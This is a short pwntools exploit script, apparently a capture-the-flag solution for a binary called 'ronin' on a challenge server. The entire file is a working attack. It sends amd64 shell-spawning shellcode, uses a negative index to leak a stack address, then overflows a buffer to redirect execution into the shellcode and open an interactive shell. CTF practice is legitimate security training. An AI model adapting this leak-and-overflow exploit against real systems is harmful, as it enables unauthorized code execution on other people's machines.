#!/usr/bin/env python3

from pwn import *

exe = ELF("./ronin")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                set {int}'usleep@plt'=0xc3
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13372)

    return r


def main():
    r = conn()

    shellcode = asm(shellcraft.amd64.linux.sh())
    log.info(f"{len(shellcode)=}")
    r.sendline(b'Chase after it.' + shellcode)

    r.recvuntil(b'Which way will you look? ')
    r.sendline(b'-4')
    leak = int.from_bytes(r.recvn(6, timeout=10), 'little')
    log.info(f"{leak=:02x}")

    # the offset of the leaked stack address to the beginning of our shellcode
    # which is in the earlier buffer
    offset = 65
    r.sendline(b'2')
    r.sendline(b'A'*40 + p64(leak - offset))

    r.interactive()


if __name__ == "__main__":
    main()
